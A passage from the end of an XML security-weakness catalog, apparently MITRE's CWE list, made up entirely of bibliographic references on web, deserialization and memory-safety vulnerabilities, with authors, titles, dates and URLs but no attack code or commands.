			<Publication_Day>---26</Publication_Day>
			<Publisher>SANS Software Security Institute</Publisher>
			<URL>https://web.archive.org/web/20100530231203/http://blogs.sans.org:80/appsecstreetfighter/2010/03/26/top-25-series-rank-25-race-conditions/</URL>
			<URL_Date>2023-04-07</URL_Date>
		</External_Reference>
      <External_Reference Reference_ID="REF-422">
			<Author>Richard Stanway (r1CH)</Author>
			<Title>Dynamic File Uploads, Security and You</Title>
			<URL>https://web.archive.org/web/20090208005456/http://shsc.info/FileUploadSecurity</URL>
			<URL_Date>2023-04-07</URL_Date>
		</External_Reference>
      <External_Reference Reference_ID="REF-423">
			<Author>Johannes Ullrich</Author>
			<Title>8 Basic Rules to Implement Secure File Uploads</Title>
			<Publication_Year>2009</Publication_Year>
			<Publication_Month>--12</Publication_Month>
			<Publication_Day>---28</Publication_Day>
			<URL>https://www.sans.org/blog/8-basic-rules-to-implement-secure-file-uploads/</URL>
			<URL_Date>2023-04-07</URL_Date>
		</External_Reference>
      <External_Reference Reference_ID="REF-424">
			<Author>Johannes Ullrich</Author>
			<Title>Top 25 Series - Rank 8 - Unrestricted Upload of Dangerous File Type</Title>
			<Publication_Year>2010</Publication_Year>
			<Publication_Month>--02</Publication_Month>
			<Publication_Day>---25</Publication_Day>
			<Publisher>SANS Software Security Institute</Publisher>
			<URL>https://www.sans.org/blog/top-25-series-rank-8-unrestricted-upload-of-dangerous-file-type/</URL>
			<URL_Date>2023-04-07</URL_Date>
		</External_Reference>
      <External_Reference Reference_ID="REF-461">
			<Author>Matthias Kaiser</Author>
			<Title>Exploiting Deserialization Vulnerabilities in Java</Title>
			<Publication_Year>2015</Publication_Year>
			<Publication_Month>--10</Publication_Month>
			<Publication_Day>---28</Publication_Day>
			<URL>https://www.slideshare.net/codewhitesec/exploiting-deserialization-vulnerabilities-in-java-54707478</URL>
			<URL_Date>2023-04-07</URL_Date>
		</External_Reference>
      <External_Reference Reference_ID="REF-462">
			<Author>Sam Thomas</Author>
			<Title>PHP unserialization vulnerabilities: What are we missing?</Title>
			<Publication_Year>2015</Publication_Year>
			<Publication_Month>--08</Publication_Month>
			<Publication_Day>---27</Publication_Day>
			<URL>https://www.slideshare.net/_s_n_t/php-unserialization-vulnerabilities-what-are-we-missing</URL>
			<URL_Date>2023-04-07</URL_Date>
		</External_Reference>
      <External_Reference Reference_ID="REF-463">
			<Author>Gabriel Lawrence</Author>
			<Author>Chris Frohoff</Author>
			<Title>Marshalling Pickles: How deserializing objects can ruin your day</Title>
			<Publication_Year>2015</Publication_Year>
			<Publication_Month>--01</Publication_Month>
			<Publication_Day>---28</Publication_Day>
			<URL>https://www.slideshare.net/frohoff1/appseccali-2015-marshalling-pickles</URL>
			<URL_Date>2023-04-07</URL_Date>
		</External_Reference>
      <External_Reference Reference_ID="REF-464">
			<Author>Heine Deelstra</Author>
			<Title>Unserializing user-supplied data, a bad idea</Title>
			<Publication_Year>2010</Publication_Year>
			<Publication_Month>--08</Publication_Month>
			<Publication_Day>---25</Publication_Day>
			<URL>https://drupalsun.com/heine/2010/08/25/unserializing-user-supplied-data-bad-idea</URL>
			<URL_Date>2023-04-07</URL_Date>
		</External_Reference>
      <External_Reference Reference_ID="REF-465">
			<Author>Manish S. Saindane</Author>
			<Title>Black Hat EU 2010 - Attacking Java Serialized Communication</Title>
			<Publication_Year>2010</Publication_Year>
			<Publication_Month>--04</Publication_Month>
			<Publication_Day>---26</Publication_Day>
			<URL>https://www.slideshare.net/msaindane/black-hat-eu-2010-attacking-java-serialized-communication</URL>
			<URL_Date>2023-04-07</URL_Date>
		</External_Reference>
      <External_Reference Reference_ID="REF-466">
			<Author>Nadia Alramli</Author>
			<Title>Why Python Pickle is Insecure</Title>
			<Publication_Year>2009</Publication_Year>
			<Publication_Month>--09</Publication_Month>
			<Publication_Day>---09</Publication_Day>
			<URL>http://michael-rushanan.blogspot.com/2012/10/why-python-pickle-is-insecure.html</URL>
			<URL_Date>2023-04-07</URL_Date>
		</External_Reference>
      <External_Reference Reference_ID="REF-467">
			<Author>Nelson Elhage</Author>
			<Title>Exploiting misuse of Python's "pickle"</Title>
			<Publication_Year>2011</Publication_Year>
			<Publication_Month>--03</Publication_Month>
			<Publication_Day>---20</Publication_Day>
			<URL>https://blog.nelhage.com/2011/03/exploiting-pickle/</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-468">
			<Author>Chris Frohoff</Author>
			<Title>Deserialize My Shorts: Or How I Learned to Start Worrying and Hate Java Object Deserialization</Title>
			<Publication_Year>2016</Publication_Year>
			<Publication_Month>--03</Publication_Month>
			<Publication_Day>---21</Publication_Day>
			<URL>https://speakerdeck.com/frohoff/owasp-sd-deserialize-my-shorts-or-how-i-learned-to-start-worrying-and-hate-java-object-deserialization</URL>
			<URL_Date>2023-04-07</URL_Date>
		</External_Reference>
      <External_Reference Reference_ID="REF-685">
			<Author>Pascal Meunier</Author>
			<Title>Meta-Character Vulnerabilities</Title>
			<Publication_Year>2008</Publication_Year>
			<Publication_Month>--02</Publication_Month>
			<Publication_Day>---20</Publication_Day>
			<URL>https://web.archive.org/web/20100714032622/https://www.cs.purdue.edu/homes/cs390s/slides/week09.pdf</URL>
			<URL_Date>2023-04-07</URL_Date>
		</External_Reference>
      <External_Reference Reference_ID="REF-686">
			<Author>Robert Auger</Author>
			<Title>OS Commanding</Title>
			<Publication_Year>2009</Publication_Year>
			<Publication_Month>--06</Publication_Month>
			<URL>http://projects.webappsec.org/w/page/13246950/OS%20Commanding</URL>
			<URL_Date>2023-04-07</URL_Date>
		</External_Reference>
      <External_Reference Reference_ID="REF-687">
			<Author>Lincoln Stein</Author>
			<Author>John Stewart</Author>
			<Title>The World Wide Web Security FAQ</Title>
			<Publication_Year>2002</Publication_Year>
			<Publication_Month>--02</Publication_Month>
			<Publication_Day>---04</Publication_Day>
			<URL>https://www.w3.org/Security/Faq/wwwsf4.html</URL>
			<URL_Date>2023-04-07</URL_Date>
		</External_Reference>
      <External_Reference Reference_ID="REF-688">
			<Author>Jordan Dimov, Cigital</Author>
			<Title>Security Issues in Perl Scripts</Title>
			<URL>https://www.cgisecurity.com/lib/sips.html</URL>
			<URL_Date>2023-04-07</URL_Date>
		</External_Reference>
      <External_Reference Reference_ID="REF-690">
			<Author>Frank Kim</Author>
			<Title>Top 25 Series - Rank 9 - OS Command Injection</Title>
			<Publication_Year>2010</Publication_Year>
			<Publication_Month>--02</Publication_Month>
			<Publication_Day>---24</Publication_Day>
			<Publisher>SANS Software Security Institute</Publisher>
			<URL>https://www.sans.org/blog/top-25-series-rank-9-os-command-injection/</URL>
			<URL_Date>2023-04-07</URL_Date>
		</External_Reference>
      <External_Reference Reference_ID="REF-709">
			<Author>Jeremiah Grossman</Author>
			<Author>Robert "RSnake" Hansen</Author>
			<Author>Petko "pdp" D. Petkov</Author>
			<Author>Anton Rager</Author>
			<Author>Seth Fogie</Author>
			<Title>XSS Attacks</Title>
			<Publication_Year>2007</Publication_Year>
			<Publisher>Syngress</Publisher>
		</External_Reference>
      <External_Reference Reference_ID="REF-712">
			<Title>Cross-site scripting</Title>
			<Publication_Year>2008</Publication_Year>
			<Publication_Month>--08</Publication_Month>
			<Publication_Day>---26</Publication_Day>
			<Publisher>Wikipedia</Publisher>
			<URL>https://en.wikipedia.org/wiki/Cross-site_scripting</URL>
			<URL_Date>2023-04-07</URL_Date>
		</External_Reference>
      <External_Reference Reference_ID="REF-714">
			<Author>RSnake</Author>
			<Title>XSS (Cross Site Scripting) Cheat Sheet</Title>
			<URL>http://ha.ckers.org/xss.html</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-715">
			<Author>Microsoft</Author>
			<Title>Mitigating Cross-site Scripting With HTTP-only Cookies</Title>
			<URL>https://learn.microsoft.com/en-us/previous-versions//ms533046(v=vs.85)?redirectedfrom=MSDN</URL>
			<URL_Date>2023-04-07</URL_Date>
		</External_Reference>
      <External_Reference Reference_ID="REF-716">
			<Author>Mark Curphey, Microsoft</Author>
			<Title>Anti-XSS 3.0 Beta and CAT.NET Community Technology Preview now Live!</Title>
			<URL>https://learn.microsoft.com/en-us/archive/blogs/cisg/anti-xss-3-0-beta-and-cat-net-community-technology-preview-now-live</URL>
			<URL_Date>2023-04-07</URL_Date>
		</External_Reference>
      <External_Reference Reference_ID="REF-718">
			<Author>Ivan Ristic</Author>
			<Title>XSS Defense HOWTO</Title>
			<URL>https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/xss-defense-howto/</URL>
			<URL_Date>2023-04-07</URL_Date>
		</External_Reference>
      <External_Reference Reference_ID="REF-719">
			<Author>OWASP</Author>
			<Title>Web Application Firewall</Title>
			<URL>http://www.owasp.org/index.php/Web_Application_Firewall</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-720">
			<Author>Web Application Security Consortium</Author>
			<Title>Web Application Firewall Evaluation Criteria</Title>
			<URL>http://projects.webappsec.org/w/page/13246985/Web%20Application%20Firewall%20Evaluation%20Criteria</URL>
			<URL_Date>2023-04-07</URL_Date>
		</External_Reference>
      <External_Reference Reference_ID="REF-721">
			<Author>RSnake</Author>
			<Title>Firefox Implements httpOnly And is Vulnerable to XMLHTTPRequest</Title>
			<Publication_Year>2007</Publication_Year>
			<Publication_Month>--07</Publication_Month>
			<Publication_Day>---19</Publication_Day>
		</External_Reference>
      <External_Reference Reference_ID="REF-722">
			<Title>XMLHttpRequest allows reading HTTPOnly cookies</Title>
			<Publisher>Mozilla</Publisher>
			<URL>https://bugzilla.mozilla.org/show_bug.cgi?id=380418</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-723">
			<Title>Apache Wicket</Title>
			<URL>http://wicket.apache.org/</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-724">
			<Author>OWASP</Author>
			<Title>XSS (Cross Site Scripting) Prevention Cheat Sheet</Title>
			<URL>http://www.owasp.org/index.php/XSS_(Cross_Site_Scripting)_Prevention_Cheat_Sheet</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-725">
			<Author>OWASP</Author>
			<Title>DOM based XSS Prevention Cheat Sheet</Title>
			<URL>http://www.owasp.org/index.php/DOM_based_XSS_Prevention_Cheat_Sheet</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-726">
			<Author>Jason Lam</Author>
			<Title>Top 25 series - Rank 1 - Cross Site Scripting</Title>
			<Publication_Year>2010</Publication_Year>
			<Publication_Month>--02</Publication_Month>
			<Publication_Day>---22</Publication_Day>
			<Publisher>SANS Software Security Institute</Publisher>
			<URL>https://www.sans.org/blog/top-25-series-rank-1-cross-site-scripting/</URL>
			<URL_Date>2023-04-07</URL_Date>
		</External_Reference>
      <External_Reference Reference_ID="REF-729">
			<Author>Johannes Ullrich</Author>
			<Title>Top 25 Series - Rank 11 - Hardcoded Credentials</Title>
			<Publication_Year>2010</Publication_Year>
			<Publication_Month>--03</Publication_Month>
			<Publication_Day>---10</Publication_Day>
			<Publisher>SANS Software Security Institute</Publisher>
			<URL>https://www.sans.org/blog/top-25-series-rank-11-hardcoded-credentials/</URL>
			<URL_Date>2023-04-07</URL_Date>
		</External_Reference>
      <External_Reference Reference_ID="REF-867">
			<Author>OWASP</Author>
			<Title>SQL Injection Prevention Cheat Sheet</Title>
			<URL>http://www.owasp.org/index.php/SQL_Injection_Prevention_Cheat_Sheet</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-868">
			<Author>Steven Friedl</Author>
			<Title>SQL Injection Attacks by Example</Title>
			<Publication_Year>2007</Publication_Year>
			<Publication_Month>--10</Publication_Month>
			<Publication_Day>---10</Publication_Day>
			<URL>http://www.unixwiz.net/techtips/sql-injection.html</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-869">
			<Author>Ferruh Mavituna</Author>
			<Title>SQL Injection Cheat Sheet</Title>
			<Publication_Year>2007</Publication_Year>
			<Publication_Month>--03</Publication_Month>
			<Publication_Day>---15</Publication_Day>
			<URL>https://web.archive.org/web/20080126180244/http://ferruh.mavituna.com/sql-injection-cheatsheet-oku/</URL>
			<URL_Date>2023-04-07</URL_Date>
		</External_Reference>
      <External_Reference Reference_ID="REF-870">
			<Author>David Litchfield</Author>
			<Author>Chris Anley</Author>
			<Author>John Heasman</Author>
			<Author>Bill Grindlay</Author>
			<Title>The Database Hacker's Handbook: Defending Database Servers</Title>
			<Publication_Year>2005</Publication_Year>
			<Publication_Month>--07</Publication_Month>
			<Publication_Day>---14</Publication_Day>
			<Publisher>Wiley</Publisher>
		</External_Reference>
      <External_Reference Reference_ID="REF-871">
			<Author>David Litchfield</Author>
			<Title>The Oracle Hacker's Handbook: Hacking and Defending Oracle</Title>
			<Publication_Year>2007</Publication_Year>
			<Publication_Month>--01</Publication_Month>
			<Publication_Day>---30</Publication_Day>
			<Publisher>Wiley</Publisher>
		</External_Reference>
      <External_Reference Reference_ID="REF-872">
			<Author>Microsoft</Author>
			<Title>SQL Injection</Title>
			<Publication_Year>2008</Publication_Year>
			<Publication_Month>--12</Publication_Month>
			<URL>https://learn.microsoft.com/en-us/previous-versions/sql/sql-server-2008-r2/ms161953(v=sql.105)?redirectedfrom=MSDN</URL>
			<URL_Date>2023-04-07</URL_Date>
		</External_Reference>
      <External_Reference Reference_ID="REF-873">
			<Author>Microsoft Security Vulnerability Research &amp; Defense</Author>
			<Title>SQL Injection Attack</Title>
			<URL>https://msrc.microsoft.com/blog/2008/05/sql-injection-attack/</URL>
			<URL_Date>2023-04-07</URL_Date>
		</External_Reference>
      <External_Reference Reference_ID="REF-874">
			<Author>Michael Howard</Author>
			<Title>Giving SQL Injection the Respect it Deserves</Title>
			<Publication_Year>2008</Publication_Year>
			<Publication_Month>--05</Publication_Month>
			<Publication_Day>---15</Publication_Day>
			<URL>https://learn.microsoft.com/en-us/archive/blogs/michael_howard/giving-sql-injection-the-respect-it-deserves</URL>
			<URL_Date>2023-04-07</URL_Date>
		</External_Reference>
      <External_Reference Reference_ID="REF-875">
			<Author>Frank Kim</Author>
			<Title>Top 25 Series - Rank 2 - SQL Injection</Title>
			<Publication_Year>2010</Publication_Year>
			<Publication_Month>--03</Publication_Month>
			<Publication_Day>---01</Publication_Day>
			<Publisher>SANS Software Security Institute</Publisher>
			<URL>https://www.sans.org/blog/top-25-series-rank-2-sql-injection/</URL>
			<URL_Date>2023-04-07</URL_Date>
		</External_Reference>
      <External_Reference Reference_ID="REF-913">
			<Author>Alexander Polyakov</Author>
			<Author>Dmitry Chastukhin</Author>
			<Title>SSRF vs. Business-critical applications: XXE tunneling in SAP</Title>
			<Publication_Year>2012</Publication_Year>
			<Publication_Month>--07</Publication_Month>
			<Publication_Day>---26</Publication_Day>
			<URL>https://media.blackhat.com/bh-us-12/Briefings/Polyakov/BH_US_12_Polyakov_SSRF_Business_Slides.pdf</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-914">
			<Author>Alexander Polyakov</Author>
			<Author>Dmitry Chastukhin</Author>
			<Author>Alexey Tyurin</Author>
			<Title>SSRF vs. Business-critical Applications. Part 1: XXE Tunnelling in SAP NetWeaver</Title>
			<URL>http://erpscan.com/wp-content/uploads/2012/08/SSRF-vs-Businness-critical-applications-whitepaper.pdf</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-915">
			<Author>Riyaz Ahemed Walikar</Author>
			<Title>Cross Site Port Attacks - XSPA - Part 1</Title>
			<Publication_Year>2012</Publication_Year>
			<Publication_Month>--11</Publication_Month>
			<Publication_Day>---07</Publication_Day>
			<URL>https://ibreak.software/2012/11/cross-site-port-attacks-xspa-part-1/</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-916">
			<Author>Riyaz Ahemed Walikar</Author>
			<Title>Cross Site Port Attacks - XSPA - Part 2</Title>
			<Publication_Year>2012</Publication_Year>
			<Publication_Month>--11</Publication_Month>
			<Publication_Day>---13</Publication_Day>
			<URL>https://ibreak.software/2012/11/cross-site-port-attacks-xspa-part-2/</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-917">
			<Author>Riyaz Ahemed Walikar</Author>
			<Title>Cross Site Port Attacks - XSPA - Part 3</Title>
			<Publication_Year>2012</Publication_Year>
			<Publication_Month>--11</Publication_Month>
			<Publication_Day>---14</Publication_Day>
			<URL>https://ibreak.software/2012/11/cross-site-port-attacks-xspa-part-3/</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-918">
			<Author>Vladimir Vorontsov</Author>
			<Author>Alexander Golovko</Author>
			<Title>SSRF attacks and sockets: smorgasbord of vulnerabilities</Title>
			<URL>https://www.slideshare.net/DefconRussia/vorontsov-golovko-ssrf-attacks-and-sockets-smorgasbord-of-vulnerabilities</URL>
			<URL_Date>2023-04-07</URL_Date>
		</External_Reference>
      <External_Reference Reference_ID="REF-919">
			<Author>ONsec Lab</Author>
			<Title>SSRF bible. Cheatsheet</Title>
			<Publication_Year>2013</Publication_Year>
			<Publication_Month>--01</Publication_Month>
			<Publication_Day>---26</Publication_Day>
			<URL>https://docs.google.com/document/d/1v1TkWZtrhzRLy0bYXBcdLUedXGb9njTNIJXa3u9akHM/edit?pli=1#</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-920">
			<Author>Deral Heiland</Author>
			<Title>Web Portals: Gateway To Information, Or A Hole In Our Perimeter Defenses</Title>
			<Publication_Year>2008</Publication_Year>
			<Publication_Month>--02</Publication_Month>
			<URL>http://www.shmoocon.org/2008/presentations/Web%20portals,%20gateway%20to%20information.ppt</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-956">
			<Author>Wikipedia</Author>
			<Title>Samy (computer worm)</Title>
			<URL>https://en.wikipedia.org/wiki/Samy_(computer_worm)</URL>
			<URL_Date>2018-01-16</URL_Date>
		</External_Reference>
      <External_Reference Reference_ID="REF-962">
			<Author>Object Management Group (OMG)</Author>
			<Title>Automated Source Code Security Measure (ASCSM)</Title>
			<Publication_Year>2016</Publication_Year>
			<Publication_Month>--01</Publication_Month>
			<URL>http://www.omg.org/spec/ASCSM/1.0/</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-1029">
			<Author>Aleph One</Author>
			<Title>Smashing The Stack For Fun And Profit</Title>
			<Publication_Year>1996</Publication_Year>
			<Publication_Month>--11</Publication_Month>
			<Publication_Day>---08</Publication_Day>
			<URL>http://phrack.org/issues/49/14.html</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-1031">
			<Title>Null pointer / Null dereferencing</Title>
			<Publication_Year>2019</Publication_Year>
			<Publication_Month>--07</Publication_Month>
			<Publication_Day>---15</Publication_Day>
			<Publisher>Wikipedia</Publisher>
			<URL>https://en.wikipedia.org/wiki/Null_pointer#Null_dereferencing</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-1032">
			<Title>Null Reference Creation and Null Pointer Dereference</Title>
			<Publisher>Apple</Publisher>
			<URL>https://developer.apple.com/documentation/xcode/null-reference-creation-and-null-pointer-dereference</URL>
			<URL_Date>2023-04-07</URL_Date>
		</External_Reference>
      <External_Reference Reference_ID="REF-1033">
			<Title>NULL Pointer Dereference [CWE-476]</Title>
			<Publication_Year>2012</Publication_Year>
			<Publication_Month>--09</Publication_Month>
			<Publication_Day>---11</Publication_Day>
			<Publisher>ImmuniWeb</Publisher>
			<URL>https://www.immuniweb.com/vulnerability/null-pointer-dereference.html</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-1034">
			<Author>Raoul Strackx</Author>
			<Author>Yves Younan</Author>
			<Author>Pieter Philippaerts</Author>
			<Author>Frank Piessens</Author>
			<Author>Sven Lachmund</Author>
			<Author>Thomas Walter</Author>
			<Title>Breaking the memory secrecy assumption</Title>
			<Publication_Year>2009</Publication_Year>
			<Publication_Month>--03</Publication_Month>
			<Publication_Day>---31</Publication_Day>
			<Publisher>ACM</Publisher>
			<URL>https://dl.acm.org/doi/10.1145/1519144.1519145</URL>
			<URL_Date>2023-04-07</URL_Date>
		</External_Reference>
      <External_Reference Reference_ID="REF-1035">
			<Author>Fermin J. Serna</Author>
			<Title>The info leak era on software exploitation</Title>
			<Publication_Year>2012</Publication_Year>
			<Publication_Month>--07</Publication_Month>
			<Publication_Day>---25</Publication_Day>
			<URL>https://media.blackhat.com/bh-us-12/Briefings/Serna/BH_US_12_Serna_Leak_Era_Slides.pdf</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-1109">
			<Title>LANGSEC: Language-theoretic Security</Title>
			<URL>http://langsec.org/</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-1110">
			<Title>LangSec: Recognition, Validation, and Compositional Correctness for Real World Security</Title>
			<URL>http://langsec.org/bof-handout.pdf</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-1111">
			<Author>Sergey Bratus</Author>
			<Author>Lars Hermerschmidt</Author>
			<Author>Sven M. Hallberg</Author>
			<Author>Michael E. Locasto</Author>
			<Author>Falcon D. Momot</Author>
			<Author>Meredith L. Patterson</Author>
			<Author>Anna Shubina</Author>
			<Title>Curing the Vulnerable Parser: Design Patterns for Secure Input Handling</Title>
			<Publication>USENIX ;login:</Publication>
			<Publication_Year>2017</Publication_Year>
			<URL>https://www.usenix.org/system/files/login/articles/login_spring17_08_bratus.pdf</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-1237">
			<Author>CERT Coordination Center</Author>
			<Title>Intel BIOS locking mechanism contains race condition that enables write protection bypass</Title>
			<Publication_Year>2015</Publication_Year>
			<Publication_Month>--01</Publication_Month>
			<Publication_Day>---05</Publication_Day>
			<URL>https://www.kb.cert.org/vuls/id/766164/</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-1283">
			<Author>Forescout Vedere Labs</Author>
			<Title>OT:ICEFALL: The legacy of "insecure by design" and its implications for certifications and risk management</Title>
			<Publication_Year>2022</Publication_Year>
			<Publication_Month>--06</Publication_Month>
			<Publication_Day>---20</Publication_Day>
			<URL>https://www.forescout.com/resources/ot-icefall-report/</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-1287">
			<Author>MITRE</Author>
			<Title>Supplemental Details - 2022 CWE Top 25</Title>
			<Publication_Year>2022</Publication_Year>
			<Publication_Month>--06</Publication_Month>
			<Publication_Day>---28</Publication_Day>
			<URL>https://cwe.mitre.org/top25/archive/2022/2022_cwe_top25_supplemental.html#problematicMappingDetails</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-1288">
			<Author>Julia Lokrantz</Author>
			<Title>Ethical hacking of a Smart Automatic Feed Dispenser</Title>
			<Publication_Year>2021</Publication_Year>
			<Publication_Month>--06</Publication_Month>
			<Publication_Day>---07</Publication_Day>
			<URL>http://kth.diva-portal.org/smash/get/diva2:1561552/FULLTEXT01.pdf</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-1295">
			<Author>WizCase</Author>
			<Title>Over 80 US Municipalities' Sensitive Information, Including Resident's Personal Data, Left Vulnerable in Massive Data Breach</Title>
			<Publication_Year>2021</Publication_Year>
			<Publication_Month>--07</Publication_Month>
			<Publication_Day>---20</Publication_Day>
			<URL>https://www.wizcase.com/blog/us-municipality-breach-report/</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-1296">
			<Author>Jonathan Greig</Author>
			<Title>1,000 GB of local government data exposed by Massachusetts software company</Title>
			<Publication_Year>2021</Publication_Year>
			<Publication_Month>--07</Publication_Month>
			<Publication_Day>---22</Publication_Day>
			<URL>https://www.zdnet.com/article/1000-gb-of-local-government-data-exposed-by-massachusetts-software-company/</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-1297">
			<Author>Amazon</Author>
			<Title>AWS Foundational Security Best Practices controls</Title>
			<Publication_Year>2022</Publication_Year>
			<URL>https://docs.aws.amazon.com/securityhub/latest/userguide/securityhub-controls-reference.html</URL>
			<URL_Date>2023-04-07</URL_Date>
		</External_Reference>
      <External_Reference Reference_ID="REF-1298">
			<Author>Microsoft</Author>
			<Title>Authentication and authorization in Azure App Service and Azure Functions</Title>
			<Publication_Year>2021</Publication_Year>
			<Publication_Month>--11</Publication_Month>
			<Publication_Day>---23</Publication_Day>
			<URL>https://learn.microsoft.com/en-us/azure/app-service/overview-authentication-authorization</URL>
			<URL_Date>2022-10-11</URL_Date>
		</External_Reference>
      <External_Reference Reference_ID="REF-1302">
			<Author>Google Cloud</Author>
			<Title>Authentication and authorization use cases</Title>
			<Publication_Year>2022</Publication_Year>
			<Publication_Month>--10</Publication_Month>
			<Publication_Day>---11</Publication_Day>
			<URL>https://cloud.google.com/docs/authentication/use-cases</URL>
			<URL_Date>2022-10-11</URL_Date>
		</External_Reference>
      <External_Reference Reference_ID="REF-1304">
			<Author>ICS-CERT</Author>
			<Title>ICS Alert (ICS-ALERT-13-164-01): Medical Devices Hard-Coded Passwords</Title>
			<Publication_Year>2013</Publication_Year>
			<Publication_Month>--06</Publication_Month>
			<Publication_Day>---13</Publication_Day>
			<URL>https://www.cisa.gov/news-events/ics-alerts/ics-alert-13-164-01</URL>
			<URL_Date>2023-04-07</URL_Date>
		</External_Reference>
      <External_Reference Reference_ID="REF-1332">
			<Author>John Richard Moser</Author>
			<Title>Prelink and address space randomization</Title>
			<Publication_Year>2006</Publication_Year>
			<Publication_Month>--07</Publication_Month>
			<Publication_Day>---05</Publication_Day>
			<URL>https://lwn.net/Articles/190139/</URL>
			<URL_Date>2023-04-26</URL_Date>
			</External_Reference>
      <External_Reference Reference_ID="REF-1333">
			<Author>Dmitry Evtyushkin, Dmitry Ponomarev, Nael Abu-Ghazaleh</Author>
			<Title>Jump Over ASLR: Attacking Branch Predictors to Bypass ASLR</Title>
			<Publication_Year>2016</Publication_Year>
			<URL>http://www.cs.ucr.edu/~nael/pubs/micro16.pdf</URL>
			<URL_Date>2023-04-26</URL_Date>
		</External_Reference>
      <External_Reference Reference_ID="REF-1334">
			<Author>D3FEND</Author>
			<Title>Stack Frame Canary Validation (D3-SFCV)</Title>
			<Publication_Year>2023</Publication_Year>
			<URL>https://d3fend.mitre.org/technique/d3f:StackFrameCanaryValidation/</URL>
			<URL_Date>2023-04-26</URL_Date>
		</External_Reference>
      <External_Reference Reference_ID="REF-1335">
			<Author>D3FEND</Author>
			<Title>Segment Address Offset Randomization (D3-SAOR)</Title>
			<Publication_Year>2023</Publication_Year>
			<URL>https://d3fend.mitre.org/technique/d3f:SegmentAddressOffsetRandomization/</URL>
			<URL_Date>2023-04-26</URL_Date>
		</External_Reference>
      <External_Reference Reference_ID="REF-1336">
			<Author>D3FEND</Author>
			<Title>Process Segment Execution Prevention (D3-PSEP)</Title>
			<Publication_Year>2023</Publication_Year>
			<URL>https://d3fend.mitre.org/technique/d3f:ProcessSegmentExecutionPrevention/</URL>
			<URL_Date>2023-04-26</URL_Date>
		</External_Reference>
      <External_Reference Reference_ID="REF-1337">
			<Author>Alexander Sotirov and Mark Dowd</Author>
			<Title>Bypassing Browser Memory Protections: Setting back browser security by 10 years</Title>
			<Publication_Year>2008</Publication_Year>
			<URL>https://www.blackhat.com/presentations/bh-usa-08/Sotirov_Dowd/bh08-sotirov-dowd.pdf</URL>
			<URL_Date>2023-04-26</URL_Date>
		</External_Reference>
      <External_Reference Reference_ID="REF-1344">
			<Title>2023 CWE Top 25 Most Dangerous Software Weaknesses</Title>
			<Publication_Year>2023</Publication_Year>
			<Publication_Month>--06</Publication_Month>
			<Publication_Day>---29</Publication_Day>
			<URL>http://cwe.mitre.org/top25/archive/2023/2023_cwe_top25.html</URL>
			<URL_Date>2023-06-29</URL_Date>
		</External_Reference>
      <External_Reference Reference_ID="REF-1372">
			<Title>How ast.literal_eval can cause memory exhaustion</Title>
			<Publication_Year>2022</Publication_Year>
			<Publication_Month>--12</Publication_Month>
			<Publication_Day>---14</Publication_Day>
			<Publisher>Reddit</Publisher>
			<URL>https://www.reddit.com/r/learnpython/comments/zmbhcf/how_astliteral_eval_can_cause_memory_exhaustion/</URL>
			<URL_Date>2023-11-03</URL_Date>
		</External_Reference>
      <External_Reference Reference_ID="REF-1373">
			<Title>ast - Abstract Syntax Trees</Title>
			<Publication_Year>2023</Publication_Year>
			<Publication_Month>--11</Publication_Month>
			<Publication_Day>---02</Publication_Day>
			<Publisher>Python</Publisher>
			<URL>https://docs.python.org/3/library/ast.html#ast.literal_eval</URL>
			<URL_Date>2023-11-03</URL_Date>
		</External_Reference>
   </External_References>
</Weakness_Catalog>
